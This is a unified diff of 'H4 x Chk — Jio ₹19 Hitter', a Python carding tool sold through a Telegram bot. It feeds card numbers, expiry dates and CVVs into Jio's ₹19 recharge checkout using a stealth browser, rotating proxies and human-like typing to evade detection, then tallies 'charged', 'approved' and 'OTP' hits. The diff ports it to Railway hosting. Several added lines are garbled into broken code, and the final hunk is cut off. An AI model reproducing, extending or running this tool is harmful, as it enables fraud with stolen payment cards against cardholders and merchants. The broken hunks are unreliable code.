@@ -1,9 +1,8 @@
 """
-H4 x Chk — Jio ₹19 Hitter (Single File Edition)
+H4 x Chk — Jio ₹19 Hitter (Railway Edition)
 Owner: @whoh4rsh
-Includes: Telegram bot + DB + Patchright stealth + Live logs + Advanced UI
 """
-import asyncio, json, time, random, uuid, logging, os, sqlite3
+import asyncio, json, time, random, uuid, logging, os, sqlite3, shutil
 from datetime import datetime
 from threading import Thread
 from fastapi import FastAPI, HTTPException
@@ -23,7 +22,9 @@ OWNER_HANDLE = "@whoh4rsh"
 BOT_NAME = "H4 x Chk"
 BOT_LIFETIME_DAYS = 30
 BOT_BORN = time.time()
-DB_PATH = "h4xchk.db"
+DB_PATH = os.getenv("DB_PATH", "h4xchk.db")
+HEADLESS = os.getenv("HEADLESS", "false").lower() == "true"
+PORT = int(os.getenv("PORT", "7075"))
 
 PLAN_PRICE = 19
 PLAN_ID = "19"
@@ -41,6 +42,9 @@ RAW_PROXIES = [
     "px040805.pointtoserver.com:10780",
 ]
 proxy_index = 0
+
+# Concurrency lock — Railway pe 1 check at a time (OOM se bachne ke liye)
+_check_lock = asyncio.Lock()
 
 UA_POOL = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
@@ -101,6 +105,19 @@ if (navigator.getBattery) {
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
 logger = logging.getLogger("h4xchk")
 api_app = FastAPI(title="H4 x Chk API", version="15.0")
+
+# ═══════════════════════════════════════════════════════════
+# BROWSER PATH (Railway fix)
+# ═══════════════════════════════════════════════════════════
+def get_browser_path():
+    """Find system chromium on Railway/Nix."""
+    for name in ["chromium", "chromium-browser", "google-chrome", "chrome", "chrome-headless-shell"]:
+        path = shutil.which(name)
+        if path:
+            logger.info(f"✅ System browser: {path}")
+            return path
+    logger.warning("⚠️ No system browser found, using patchright default")
+    return None
 
 # ═══════════════════════════════════════════════════════════
 # DB
@@ -244,9 +261,9 @@ def fmt_proxy(raw):
 
 def get_proxy():
     global proxy_index
-1    if not RAW_PROXIES: return None
-    p
- = RAW   _PROXIES[proxy_index % len(RAW_PROXIES)]; proxy_index +=  return fmt_proxy(p)
+    if not RAW_PROXIES: return None
+    p = RAW_PROXIES[proxy_index % len(RAW_PROXIES)]; proxy_index += 1
+    return fmt_proxy(p)
 
 def _parse_proxy_cfg(proxy):
     if not proxy: return None
@@ -270,8 +287,12 @@ async def _human_type(locator, text):
         await locator.type(ch, delay=random.randint(40, 180))
     await asyncio.sleep(random.uniform(0.2, 0.5))
 
-async def jio19_playwright(cc, mm, yy, cvv, mobile="", proxy=None,
-                            headless=True, log_cb=None):
+async def jio19_playwright(cc, mm, yy, cvv, mobile="", proxy=None, log_cb=None):
+    """Serialized — 1 check at a time (Railway RAM safe)."""
+    async with _check_lock:
+        return await _jio19_impl(cc, mm, yy, cvv, mobile, proxy, log_cb)
+
+async def _jio19_impl(cc, mm, yy, cvv, mobile="", proxy=None, log_cb=None):
     start = time.time()
     yy_f = yy[2:] if len(yy) == 4 else yy
     result = {
@@ -301,9 +322,14 @@ async def jio19_playwright(cc, mm, yy, cvv, mobile="", proxy=None,
                 "--no-first-run", "--no-default-browser-check",
                 "--disable-infobars", "--window-size=1920,1080",
                 "--start-maximized", "--lang=en-IN",
+                "--single-process",  # ← Railway RAM optimization
             ]
             await _log("Browser launching", "⏳")
-            browser = await p.chromium.launch(headless=headless, args=launch_args)
+            _chrome = get_browser_path()
+            _launch_kw = {"headless": HEADLESS, "args": launch_args}
+            if _chrome:
+                _launch_kw["executable_path"] = _chrome
+            browser = await p.chromium.launch(**_launch_kw)
             await _log("Browser ready", "✅")
 
             context = await browser.new_context(
@@ -376,12 +402,12 @@ async def jio19_playwright(cc, mm, yy, cvv, mobile="", proxy=None,
                               code="PW-101", time=f"{(time.time()-start):.2f}s")
                 return result
 
-            await _human_delay(1000, 2000)
+            await _human_d _elaylog(1000, 200("0)
 
-            await _log("Searching ₹19 plan", "🔍")
-            try:
-                plan = page.locator("text=/₹\\s*19\\b/").first
-                await plan.wait_for(state="visible", timeout=10000)
+            await _log("SearchClicking ₹19 plan", "🔍")
+           ing try:
+                plan = page Pro.locator("ceedtext=/₹\\s*19\\b",/").first
+ "                await plan.wait_for(state="visible", timeout=10000)
                 await plan.click()
                 await _log("₹19 plan selected", "✅")
             except PWTimeout:
@@ -392,7 +418,7 @@ async def jio19_playwright(cc, mm, yy, cvv, mobile="", proxy=None,
 
             await _human_delay(800, 1500)
 
-            await _log("Clicking Proceed", "⏳")
+            await⏳")
             for label in ["Recharge", "Proceed", "Pay", "Continue"]:
                 try:
                     btn = page.locator(f"button:has-text('{label}')").first
@@ -597,57 +623,4 @@ async def api_jio19(req: Jio19Request):
         raise HTTPException(429, "CC limit reached")
     proxy = get_proxy()
     r = await jio19_playwright(req.cc, req.mm, req.yy, req.cvv,
-                                mobile=req.mobile, proxy=proxy)
-    if req.user_id:
-        bump_live(req.user_id)
-        if r["status"] in ("charged","approved"): bump_hit()
-        elif r["status"] == "otp": bump_otp()
-    return r
-
-@api_app.get("/")
-async def api_root():
-    return {"status": "ok", "bot": BOT_NAME, "owner": OWNER_HANDLE}
-
-# ═══════════════════════════════════════════════════════════
-# UI HELPERS
-# ═══════════════════════════════════════════════════════════
-def fmt_time(s):
-    m, sec = divmod(int(s), 60)
-    return f"{m}m {sec}s" if m else f"{sec}s"
-
-def main_menu_kb(uid):
-    rows = [
-        [InlineKeyboardButton("📱 Jio ₹19 Hitter", callback_data="ui_jio19")],
-        [InlineKeyboardButton("📂 Mass Check (.txt)", callback_data="ui_chk"),
-         InlineKeyboardButton("📊 Live Stats", callback_data="ui_stats")],
-        [InlineKeyboardButton("💎 My Account", callback_data="ui_info"),
-         InlineKeyboardButton("🔑 Redeem Key", callback_data="ui_redeem")],
-        [InlineKeyboardButton("💬 Feedback", callback_data="ui_fb"),
-         InlineKeyboardButton("📖 Help", callback_data="ui_help")],
-    ]
-    if uid == OWNER_ID or is_admin(uid):
-        rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="ui_admin")])
-    return InlineKeyboardMarkup(rows)
-
-def admin_menu_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔑 Gen Key", callback_data="ad_genkey"),
-         InlineKeyboardButton("📊 Bot Stats", callback_data="ad_stats")],
-        [InlineKeyboardButton("👥 Users", callback_data="ad_users"),
-         InlineKeyboardButton("📩 Feedback", callback_data="ad_fb")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="ui_main")],
-    ])
-
-def back_kb(target="ui_main", label="⬅️ Back"):
-    return InlineKeyboardMarkup([[InlineKeyboardButton(label, callback_data=target)]])
-
-def user_card(u, uid):
-    live = u["live_checks"] if u else 0
-    life = u["lifetime"] if u else 0
-    kd = key_days_left(uid); cl = cc_limit_left(uid); k = get_active_key(uid)
-    used = k["cc_used"] if k else 0; lim = k["cc_limit"] if k else 0
-    role = u['role'] if u else 'guest'
-    role_emoji = {"owner": "👑", "admin": "⭐", "user": "👤"}.get(role, "👤")
-    return (
-        f"╔══════════════════════════════════╗\n"
-        f"║
+                                mobile
